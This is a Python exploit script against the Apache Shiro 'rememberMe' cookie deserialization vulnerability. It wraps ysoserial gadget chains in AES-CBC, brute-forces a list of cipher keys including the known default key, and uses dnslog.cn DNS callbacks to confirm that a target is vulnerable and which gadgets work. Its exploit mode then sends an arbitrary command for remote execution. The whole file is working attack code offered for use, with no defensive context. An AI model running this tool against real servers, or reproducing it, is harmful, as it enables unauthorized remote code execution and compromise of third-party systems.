# -*- coding: utf-8 -*-
import os
import sys
import base64
import uuid
import subprocess
import requests
import time
import random
import argparse
from Crypto.Cipher import AES

JAR_FILE = 'ysoserial-0.0.6-SNAPSHOT-all.jar'
KEY_FILE = 'keys.conf'

with open(KEY_FILE, 'r') as file:
    CipherKeys = file.readlines()

gadgets = ["JRMPClient","BeanShell1","Clojure","CommonsBeanutils1","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","CommonsCollections7","Groovy1","Hibernate1","Hibernate2","JSON1","JavassistWeld1","Jython1","MozillaRhino1","MozillaRhino2","Myfaces1","ROME","Spring1","Spring2","Vaadin1","Wicket1"]
# gadgets = ["JRMPClient", "BeanShell1", "CommonsCollections4"]

session = requests.Session()


def genpayload(params, CipherKey, fp):
    gadget, command = params
    if not os.path.exists(fp):
        raise Exception('[-] Jar file not found！')
    popen = subprocess.Popen(['java', '-jar', fp,gadget, command], stdout=subprocess.PIPE)
    BS = AES.block_size
    # print(command)
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    # key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(CipherKey), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


def check(url):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    domain = getdnshost()
    if domain:
        rhost = "http://" + domain
        for CipherKey in CipherKeys:
            ret = {"vul": False, "CipherKey": "Null", "url": target}
            try:
                print("[*] Try CipherKey: {}".format(CipherKey.strip()))
                payload = genpayload(("URLDNS", rhost), CipherKey, JAR_FILE)
                print("[*] Generator URLDNS payload done.")
                r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)
                status = r.status_code
                print("[*] Send payload | Status: {}".format(status))
                for i in range(1, 5):
                    print("[*] Waitting for Dnslog ...")
                    time.sleep(2)
                    temp = getrecord()
                    if domain in temp:
                        ret["vul"] = True
                        ret["CipherKey"] = CipherKey
                        print ("\n[+] Received Dnslog:{}\n".format(temp))
                        break
            except Exception as e:
                print("[-] Send payload | Status: Connection Target Failed!")
                print(str(e))
                pass
            if ret["vul"]:
                break
    else:
        print("[-] Check Failed!")
    return ret


def getdnshost():
    reversehost = ""
    try:
        domain = getdomain()
        if domain == "error":
            print("[-] Getdomain error")
        else:
            # reversehost = "http://" +domain
            reversehost = domain
            print("[*] Get Dnshost: {}".format(reversehost))
    except Exception:
        pass
    return reversehost


def getdomain():
    try:
        ret = session.get("http://www.dnslog.cn/getdomain.php?t=" + str(random.randint(100000, 999999)), timeout=10).text
    except Exception as e:
        print("[-] Getdomain Error:" + str(e))
        ret = "error"
        pass
    return ret


def getrecord():
    try:
        ret = session.get("http://www.dnslog.cn/getrecords.php?t="+str(random.randint(100000,999999)),timeout=10).text
        # print(ret)
    except Exception as e:
        print("[-] Getrecord error:" + str(e))
        ret = "error"
        pass
    return ret


def exploit(url, gadget, command, CipherKey):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    try:
        payload = genpayload((gadget, command), CipherKey, JAR_FILE)
        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)
        status = r.status_code
        print("[*] Send payload | Status: {}".format(status))
        print(r.text)
    except Exception as e:
        print("[-] Exploit Failed!:" + str(e))
        pass


def detector(url, command, CipherKey):
    result = []
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    try:
        for g in gadgets:
            g = g.strip()
            domain = getdnshost()
            if domain:
                if g == "JRMPClient":
                    param = "%s:80" % domain
                else:
                    param = command.replace("{dnshost}", domain)
                payload = genpayload((g, param), CipherKey, JAR_FILE)
                print("[*] Try Gadgets: {}".format(g))
                r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)
                status = r.status_code
                print("[*] Send payload | Status: {}".format(status))
                # print(r.read())
                for i in range(1, 5):
                    # print("checking.....")
                    time.sleep(2)
                    temp = getrecord()
                    if domain in temp:
                        print ("\n[+] Received Dnslog:{}".format(temp))
                        ret = g
                        # ret["CipherKey"] = CipherKey
                        result.append(ret)
                        print("\n[+] Found gadget: {}\n".format(g))
                        break
            else:
                print("[-] Getdomain error!")
                # break
        # print(r.text)
    except Exception as e:
        print("[-] Detector Failed!:" + str(e))
        pass
    return result


def parser_error(errmsg):
    print("Usage: python " + sys.argv[0] + " [Options] use -h for help")
    sys.exit()


def parse_args():
    # parse the arguments
    parser = argparse.ArgumentParser(epilog="\tExample: \r\npython " + sys.argv[0] + " -u target")
    parser.error = parser_error
    parser._optionals.title = "-OPTIONS-"
    parser.add_argument('-u', '--url', help="Target url.", default="http://127.0.0.1:8080", required=True)
    parser.add_argument('-t', '--type', help='Check or Exploit. Check:1, Find gadget:2, Exploit:3', default="1",required=False)
    parser.add_argument('-g', '--gadget', help='gadget', default="CommonsCollections2", required=False)
    parser.add_argument('-c', '--command', help='gadget command', default="whoami", required=False)
    parser.add_argument('-k', '--key', help='CipherKey', default="kPH+bIxk5D2deZiIxcaaaA==", required=False)
    return parser.parse_args()


if __name__ == '__main__':
    args = parse_args()
    url = args.url
    type = args.type
    command = args.command
    key = args.key
    gadget = args.gadget
    print("[*] Checking Url: {}".format(url))
    if type == "1":
        r = check(url)
        print("\n[+] Vul:{} | Url:{} | CipherKey:{}\n".format(str(r["vul"]), url, r["CipherKey"]))
    elif type == "2":
        r = detector(url, command, key)
        if r:
            print("\n[+] [Sum] Found gadget:{}\n".format(r))
    elif type == "3":
        exploit(url, gadget, command, key)
        print("[+] Exploit done.")
    else:
        print("[-] Invalid type")
